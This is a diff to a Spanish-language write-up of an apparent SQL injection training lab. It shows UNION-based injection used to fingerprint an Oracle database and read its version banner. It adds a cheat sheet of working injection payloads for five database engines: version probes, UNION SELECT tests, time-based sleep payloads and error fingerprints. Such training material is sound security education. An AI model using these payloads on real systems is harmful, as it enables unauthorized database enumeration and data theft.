@@ -212,7 +212,7 @@ Por lo tanto el **payload** es `'OR 1=1-- -`
 SELECT * FROM object WHERE category = '' OR 1=2-- -
 ```
 
-Como alternativa más robusta, ' AND 1=2-- - garantiza que la condición sea falsa aunque existan filas con category = ''.
+Como alternativa más robusta, `' AND 1=2-- -` garantiza que la condición sea falsa aunque existan filas con category = ''.
 
 Las respuestas obtenidas **CONFIRMAN** la vulnerabilidad:
 
@@ -234,6 +234,137 @@ En este caso, probamos `' ORDER BY 1-- -` y `' ORDER BY 2-- -` y obtenemos una r
 
 ![Verificación de número de columnas seleccionada en la query](./images/SQLI12.png)
 
-Con el payload `' ORDER BY 2-- -` no obtenemos error, por lo tanto podemos asegurar que mínimo hay dos columnas que se estan seleccionando en la query.
+Con el *payload* `' ORDER BY 2-- -` no obtenemos error, lo que indica que la consulta selecciona al menos dos columnas.
 
 ![Error al tratar de ordenar por la tercera columna](./images/SQLI13.png)
+
+Sin embargo, con el *payload* `' ORDER BY 3-- -` obtenemos un error interno del servidor, el motor devuelve un error porque la posición 3 no existe en el **SELECT**. Conviene matizar que no es un error de sintaxis, es decir, la consulta es sintácticamente válida, pero referencia una columna inexistente *(Unknown column '3' in 'order clause' en MySQL)*. El **backend**, al no manejar la excepción, devuelve un 500. Combinando ambas pruebas, concluimos que la query selecciona exactamente dos columnas.
+
+El siguiente paso es comprobar si alguna de esas columnas acepta texto y se refleja en la respuesta, para poder exfiltrar información a través de ella. Para ello usamos **UNION SELECT**, que requiere que la segunda consulta tenga el mismo número de columnas que la original (dos, en este caso). Mantenemos una columna a NULL para aislar la prueba en la otra:
+
+```sql
+' UNION SELECT 'a', NULL-- -
+' UNION SELECT NULL, 'a'-- -
+```
+
+Si el motor acepta el UNION y el valor 'a' aparece en la interfaz web, esa columna acepta texto y se refleja en la respuesta, por lo que es la candidata para exfiltrar datos. Con esa información ya podemos construir el payload definitivo para leer el tipo y la versión de la base de datos.
+
+Sin embargo, este payload devuelve un 500 Internal Server Error:
+
+![Error interno del servidor a pesar de payload correcto](./images/SQLI14.png)
+
+Este fallo es información valiosa. La consulta es sintácticamente correcta en la mayoría de motores (**MySQL**, **PostgreSQL**, **SQL Server**, **SQLite** permiten un *SELECT* de expresiones constantes sin *FROM*), así que el error apunta a un motor con una restricción adicional. Ese motor es **Oracle**, donde todo *SELECT* debe llevar una cláusula *FROM*, incluso cuando solo se seleccionan valores constantes. Para esos casos **Oracle** proporciona la tabla especial **DUAL**, una tabla ficticia de una fila y una columna que sirve precisamente para este tipo de consultas.
+
+Añadiendo `FROM DUAL` el *payload* queda así:
+
+```sql
+' UNION SELECT 'a', NULL FROM DUAL-- -
+```
+
+Y en este caso la consulta se ejecuta correctamente y el valor 'a' aparece reflejado en la interfaz web:
+
+![Confirmación de motor Oracle y canal de exfiltración de datos](./images/SQLI15.png)
+
+Este resultado nos aporta dos conclusiones a la vez:
+
+El motor es Oracle, porque la consulta solo funciona añadiendo FROM DUAL. Es un comportamiento característico y difícil de confundir con otros motores.
+
+La primera columna acepta texto y se refleja en la respuesta, por lo que es la candidata para exfiltrar datos.
+
+En este laboratorio en particular se nos pide obtener el banner con la versión de la base de datos. Sabiendo que el motor es Oracle, el payload para leerla es el siguiente:
+
+```sql
+' UNION SELECT banner, NULL FROM v$version-- -
+```
+
+De esta forma confirmamos la exfiltración del tipo y la versión de la base de datos, que era el objetivo del laboratorio:
+
+![Inyección valida con exfiltración de version de la base de datos](./images/SQLI16.png)
+
+### Cheat sheet: identificación del motor de base de datos
+
+Cada motor de base de datos habla un dialecto SQL distinto. La sintaxis de los comentarios, los operadores de concatenación, las funciones de versión, las tablas de metadatos e incluso la obligatoriedad de la cláusula `FROM` cambian de un motor a otro. Por eso, identificar el motor **no es un paso opcional**: un payload que funciona en MySQL puede fallar estrepitosamente en Oracle o en SQL Server, y sin saber contra qué estamos hablando perderemos tiempo probando sintaxis incompatibles.
+
+Esta sección recoge las diferencias clave y los payloads mínimos para identificar los cinco motores más habituales en entornos web: **MySQL/MariaDB, PostgreSQL, Microsoft SQL Server (MSSQL), Oracle y SQLite**.
+
+#### Tabla comparativa de construcciones clave
+
+| Construcción | MySQL / MariaDB | PostgreSQL | MSSQL | Oracle | SQLite |
+| :--- | :--- | :--- | :--- | :--- | :--- |
+| **Función de versión** | `@@version` o `version()` | `version()` | `@@version` | `SELECT banner FROM v$version` | `sqlite_version()` |
+| **Concatenación de cadenas** | `CONCAT('a','b')` o `'a' 'b'` | `'a' \|\| 'b'` | `'a' + 'b'` o `CONCAT()` | `'a' \|\| 'b'` o `CONCAT()` | `'a' \|\| 'b'` |
+| **Comentario de línea** | `-- ` (espacio obligatorio) o `#` | `-- ` | `-- ` | `-- ` | `-- ` |
+| **Comentario de bloque** | `/* */` y `/*! */` | `/* */` (anidable) | `/* */` | `/* */` | `/* */` |
+| **`SELECT` constante** | No necesita `FROM` | No necesita `FROM` | No necesita `FROM` | **`FROM DUAL` obligatorio** | No necesita `FROM` |
+| **Límite de filas** | `LIMIT n OFFSET m` | `LIMIT n OFFSET m` | `SELECT TOP n` | `WHERE rownum <= n` | `LIMIT n OFFSET m` |
+
+> **Nota sobre `||` en MySQL**: el operador `||` significa **OR lógico** por defecto (a menos que se active `PIPES_AS_CONCAT`). Por eso MySQL no usa `||` para concatenar; de ahí que recurra a `CONCAT()` o a la yuxtaposición con espacio.
+
+#### Pistas en los mensajes de error
+
+Cuando los errores de la base de datos llegan al cliente, el propio mensaje suele delatar al motor. Estos son los fragmentos más característicos:
+
+| Fragmento en el error | Motor probable |
+| :--- | :--- |
+| `You have an error in your SQL syntax` / `check the manual that corresponds to your MySQL server version` | **MySQL / MariaDB** |
+| `pg_query()`, `PSQLException`, `LINE n:` | **PostgreSQL** |
+| `Microsoft SQL Server`, `Unclosed quotation mark after the character string`, `Incorrect syntax near` | **MSSQL** |
+| `ORA-` seguido de un código de cinco dígitos, `Oracle error` | **Oracle** |
+| `SQLite` (a secas, o mensajes genéricos de sintaxis sin prefijo de servidor) | **SQLite** |
+
+#### Identificación por motor: payloads y particularidades
+
+A continuación se detalla, para cada motor, cómo leer la versión, cómo probar un `UNION SELECT` mínimo y qué funciones de retardo usar si la identificación es ciega (*time-based*).
+
+##### MySQL / MariaDB
+
+- **Versión**: `SELECT @@version` o `SELECT version()`. El resultado típico es una cadena como `8.0.35-0ubuntu0.22.04.1` o `10.6.12-MariaDB`.
+- **Comentarios**: `-- ` **exige un espacio** después de los dos guiones; `#` también funciona. En contextos donde los espacios se filtran, `/**/` puede actuar como separador.
+- **Prueba `UNION SELECT`** (asumiendo 2 columnas): `' UNION SELECT @@version, NULL-- -`.
+- **Time-based**: `' AND SLEEP(5)-- -` o `' AND IF(1=1, SLEEP(5), 0)-- -`.
+- **Esquema**: `information_schema.tables` y `information_schema.columns`.
+
+##### PostgreSQL
+
+- **Versión**: `SELECT version()`. Devuelve una cadena como `PostgreSQL 16.2 on x86_64-pc-linux-gnu...`.
+- **Concatenación**: `'a' || 'b'`. El operador `||` es exclusivamente de concatenación, a diferencia de MySQL.
+- **Prueba `UNION SELECT`**: `' UNION SELECT version(), NULL-- -`.
+- **Time-based**: `' AND pg_sleep(5)-- -` o `' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -`.
+- **Esquema**: `information_schema.tables` (a menudo filtrando por `table_schema = 'public'`).
+
+##### Microsoft SQL Server (MSSQL)
+
+- **Versión**: `SELECT @@version`. Devuelve una cadena que empieza por `Microsoft SQL Server ...`.
+- **Concatenación**: `'a' + 'b'`. El operador `+` es suma y concatenación; si se usa con tipos numéricos, suma.
+- **Prueba `UNION SELECT`**: `' UNION SELECT @@version, NULL-- ` (en MSSQL el comentario `--` no requiere espacio después, aunque es buena práctica ponerlo).
+- **Time-based**: `'; WAITFOR DELAY '0:0:5'-- ` o `' IF (1=1) WAITFOR DELAY '0:0:5'-- `.
+- **Esquema**: `sysobjects` (tablas del sistema) o `information_schema` en versiones modernas.
+
+##### Oracle
+
+- **Versión**: `SELECT banner FROM v$version`. Devuelve varias filas; la primera suele contener la versión del motor (p. ej., `Oracle Database 19c...`). Puede limitarse con `WHERE rownum = 1`.
+- **Restricción clave**: **todo `SELECT` debe llevar `FROM`**. Para valores constantes se usa la tabla ficticia `DUAL`. Esta es la peculiaridad que delató al motor en este laboratorio.
+- **Comentario**: `-- ` (con espacio después).
+- **Prueba `UNION SELECT`**: `' UNION SELECT banner, NULL FROM v$version-- -`. Si el número de columnas no coincide, ajustar los `NULL`.
+- **Time-based**: `' AND dbms_pipe.receive_message('a', 5)-- -` (o `dbms_lock.sleep(5)` en versiones más recientes).
+- **Esquema**: `all_tables`, `all_tab_columns`, `user_tables`, `user_tab_columns`.
+
+##### SQLite
+
+- **Versión**: `SELECT sqlite_version()`. Devuelve una cadena como `3.45.1`.
+- **Concatenación**: `'a' || 'b'`.
+- **Comentario**: `-- ` (con espacio después).
+- **Prueba `UNION SELECT`**: `' UNION SELECT sqlite_version(), NULL-- -` (no necesita `FROM`).
+- **Time-based**: SQLite **no tiene una función de retardo nativa** como `SLEEP`. Para pruebas ciegas se recurre a consultas pesadas (p. ej., `RANDOMBLOB(100000000)`), lo que la hace menos adecuada para técnicas basadas en tiempo.
+- **Esquema**: `sqlite_master` (contiene el esquema de tablas e índices).
+
+#### Procedimiento práctico de identificación
+
+La identificación sigue un orden de coste creciente: primero se aprovecha la información que ya tenemos, luego se provocan errores y, si es necesario, se usan diferenciales de sintaxis o de tiempo.
+
+1. **Inferencia por contexto**: un endpoint `.aspx` detrás de IIS sugiere MSSQL; una aplicación WordPress o Laravel sugiere MySQL/MariaDB; Django o Rails sugiere PostgreSQL. Es una pista inicial, no una confirmación.
+2. **Lectura de errores**: si algún error de la base de datos llega al cliente, la tabla de “Pistas en los mensajes de error” suele bastar para identificar el motor.
+3. **Diferenciales de sintaxis**: si los errores están suprimidos, se envía un payload que solo es válido en un motor y se observa si la respuesta cambia (por ejemplo, un `UNION SELECT` con y sin `FROM`). Esto funciona incluso en modo ciego, usando el oráculo booleano.
+4. **Funciones de versión**: una vez identificado el motor, se lee la cadena de versión exacta para saber qué características (funciones de agregación, JSON, etc.) están disponibles.
+
+Con esta guía, el bloque de identificación de motor queda cubierto de forma sistemática y reutilizable para futuros laboratorios o escenarios reales.
